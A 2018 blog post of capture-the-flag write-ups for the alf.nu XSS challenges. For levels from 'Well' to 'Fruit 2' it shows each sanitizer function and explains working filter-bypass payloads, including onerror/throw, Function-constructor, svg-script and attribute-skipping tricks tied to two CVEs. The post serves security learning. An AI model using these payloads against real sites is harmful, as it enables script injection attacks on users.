---
layout: post
title:  "alf.nu XSS challenges Write-ups level18 to level29 (part one)"
date:   2018-08-18 21:46:23 +0800
categories: jekyll update
---
# alf.nu XSS challenges Write-ups level18 to level29 (part one)
The [alf.nu XSS challenges](https://alf.nu/alert(1)) has been online for a really lone time and there are already some good write ups. Since the challenges are updating, I didn't find any write ups for the newer challenges(level 18 aka "Well" to level 29 aka "Entities 2"). So these are my solutions. I'm more than happy if you discuss with me @oicu11154755 oicu0619@163.com

Please check out the write up for level1 to level 17 written by **</pwntester>**:
- http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/
- http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/

## Well
### code
```javascript
function escape(s) {
//http://www.avlidienbrunn.se/xsschallenge/

s = s.replace(/[\r\n\u2028\u2029\\;,()\[\]<]/g, '');
return "<script> var email = '" + s + "'; <\/script>";
}
```
This level want us to execute alert(1) without parentheses, angle brackets and several other special characters. There are several methods to do so, as the "onerror throw" trick which we may use in the **No** level, or this backtick trick in ES6:
### solution
```javascript
'-alert.call`${1}`-'
```
### background info
String plus expressions enclosed by backticks `` ` `` are called template literals. The expression within is indicated by dollar sign and curly braces`${expression}`. This is a grammer from ES6.One can directly pass template literals to a function without parentheses:
```javascript
console.log`text1${expression}text2`
```
In this case, 2 parameters will be transfered to `console.log`, first is the array of the text, which is `["text1","text2"]`, the second is the value of the `expression`.
So, if we do like this:
```javascript
alert`1`
```
There will only be on parameter transfered to `alert`, which is ["1"]. But the challenge want the number 1, no the array of the String "1". So we do like:
```javascript
alert.call`${1}`
```
2 parameter will be transfer to `alert.call`, first parameter is empty array which will be the `this` of the alert, second is expression `1`, whose value is number 1.

## No
### code
```javascript
// submitted by Stephen Leppik

function escape(s) {
s = s.replace(/[()`<]/g, ''); // no function calls

return '<script>\n' +
'var string = "' + s + '";\n' +
'console.log(string);\n' +
'</script>';
}
```
### solution
This level is also about execute JS function without parentheses and angle brackets. We can use onerror trick here:
```javascript
";onerror=eval;throw"=alert\x281\x29
```
moreover, we can use octal to shorten it:
```javascript
";onerror=eval;throw"=alert\501\51
```
As in this level, there is a `console.log(string)` after out input, so we may also redefine `console.log` to `alert`:
```javascript
"|1;console.log=alert//
```
### background info
`window.onerror` handles JS runtime error. Any runtime error including the one we triggered by `throw` will pass several arguments to the `window.onerror` function. 
- error message
- file name
- line number
- ...

The first argument will be error message, a string, in chrome it will be `"Uncaught ErrorType ErrorMessage"`. If we `throw` an error by ourself, like `throw 1`, the argument won't have ErrorType, so it will be `"Uncaught 1"`. In firefox it will be `"Uncaught exception: 1"`
So we may execute `alert` without parentheses like this:
```javascript
onerror=alert;
throw 1;
```
In this case, the parameter passed to `alert` will a string `"Uncaught 1"`. The challenge require alerting number 1, not string. So we may do things like
```javascript
onerror=eval;
throw "=alert\x281\x29"
```
So the parameter passed to `eval` will be string `"Uncaught=alert(1)"`, `alert(1)` will be executed and `undefined` will be assigned to `Uncaught` 
## K'Z'K
### code
```javascript
// submitted by Stephen Leppik
function escape(s) {
// remove vowels in honor of K'Z'K the Destroyer
s = s.replace(/[aeiouy]/gi, '');
return '<script>console.log("' + s + '");</script>';
}
```
### solution
```javascript
"["s\x75b"]["c\x6fnstr\x75ct\x6fr"]("\x61l\x65rt(1)")(),"
```
or we can shorten it:
```javascript
",CSS["c\x6fnstr\x75ct\x6fr"]("\x61l\x65rt(1)")(),"
```
### background information
This level filter out the letter `/[aeiouy]/gi` from our input, and want us to execute `alert(1)`. We can build a string `"alert(1)"`(because we can encode the string to pass the `/[aeiouy]/gi` filter) and call it by `eval` or some other ways. Like:
```javascript
""["sub"]["constructor"]("alert(1)")()
```
`“”`is an empty string, `sub` is a method of String, so `""["sub"]`is a function. The `constructor` of any function will be a `Function()` which may act like `eval` in this way:
```javascript
Function("alert(1)")()
```
It declare a anonymous function and immediately execute it.

We can make it short by changing `""["sub"]` with any function that do not have `/[aeiouy]/gi` in it. By enumerating the method of `window`, we find the fine candidate `CSS` function.
```javascript
CSS["constructor"]("alert(1)")()
```
This will also execute `alert(1)`.
## K'Z'K
### code
```javascript
// submitted by Stephen Leppik
function escape(s) {
// remove vowels and escape sequences in honor of K'Z'K 
// y is only sometimes a vowel, so it's only removed as a literal
s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
// remove certain characters that can be used to get vowels
s = s.replace(/[{}!=<>]/g, '');
return '<script>console.log("' + s + '");</script>';
}
```
### solution
```javascript
",CSS["c\x!6fnstr\x!75ct\x!6fr"]("\x!61l\x!65rt(1)")(),"
```
### background infomation
Pay more attention if the String is changed twice. Method is same as last challenge.
## K'Z'K
### code
```javascript
// submitted by Stephen Leppik
function escape(s) {
// remove vowels in honor of K'Z'K the Destroyer
s = s.replace(/[aeiouy]/gi, '');
// remove certain characters that can be used to get vowels
s = s.replace(/[{}!=<>\\]/g, '');
return '<script>console.log("' + s + '");</script>';
}
```
### solution
```javascript
",CSS["c"+(CSS+'')[6]+"nstr"+([].s+'')[0]+"ct"+(CSS+'')[6]+"r"]((0/0+'')[1]+"l"+([].s+'')[3]+"rt(1)")(),"
```
### background info
In this level, we still use `CSS["constructor"]("alert(1)")()` to execute. We lose `/[{}!=<>\\]/g`, so we can not use `\u` or `\x` to encode, we need to make our own alphabet without `/[{}!=<>\\]/g`
Here is how I do it:
- a:`(0/0+'')[1]`
- e:`([].s+'')[3]`
- o:`(CSS+'')[6]`
- u:`([].s+'')[0]`

We only need this 4 character.

## Fruit
### code
```javascript
// CVE-2016-4618
function escape(s) {
var div = document.implementation.createHTMLDocument().createElement('div');
div.innerHTML = s;
function f(n) {
if ('SCRIPT' === n.tagName) n.parentNode.removeChild(n);
for (var i=0; i<n.attributes.length; i++) {
var name = n.attributes[i].name;
if (name !== 'class') { n.removeAttribute(name); }
}
}
[].map.call(div.querySelectorAll('*'), f);
return div.innerHTML;
}
```
### solution
```javascript
<svg><script>alert(1)</script></svg>
```
Or we can shorten it:
```javascript
<svg><script>alert(1)
```
### background info
For DOM trees which represent HTML documents, the returned tag name is always in the canonical upper-case form. For example, tagName called on a `<div>` element returns `"DIV"`.
The tag names of elements in an XML DOM tree are returned in the same case in which they're written in the original XML file. If an XML document includes a tag `<SomeTag>`, then the tagName property's value is `"SomeTag"`.
So we may put out `<script>` tag inside XML `<svg>`.
Furthermore, the `<script>` without end tag `</script>` act differenly inside or outside `<svg>`. For example,
```html
<html>
<body>
<script>alert(1)
</body>
</html>
```
will be analysed **by browser** as:
```html
<html>
<body>
<script>alert(1)</body></html></script>
</body>
</html>
```
but
```html
<html>
<body>
<svg>
<script>alert(1)
</body>
</html>
```
will be analysed **by browser** as:
```html
<html>
<body>
<svg>
<script>alert(1)</script>
</svg>
</body>
</html>
```
This behaviour is related to how the browser analyze DOM, tokenizing and tree constructing. So in this case, we can cut off the end tag `<svg>` `<script>`, and there is no need to use `//` to quote any HTML tags which may by automatically added by browser.
## Fruit 2
### code
```javascript
// CVE-2016-7650
function escape(s) {
var div = document.implementation.createHTMLDocument().createElement('div');
div.innerHTML = s;
function f(n) {
if (/script/i.test(n.tagName)) n.parentNode.removeChild(n);
for (var i=0; i<n.attributes.length; i++) {
var name = n.attributes[i].name;
if (name !== 'class') { n.removeAttribute(name); }
}
}
[].map.call(div.querySelectorAll('*'), f);
return div.innerHTML;
}
```
### solution
```javascript
<svg a onload=alert(1)>
```
### background info
Function f sort attributes by number i. After removing `attributes[i]`, the attribute list changes, `attributes[i+1]` will become `attributes[i]`. So function f will ignore the attribute after every attribute it removes.
## Fruit 3
### help
i don't know how to do it, please help me...@oicu11154755 oicu0619@163.com
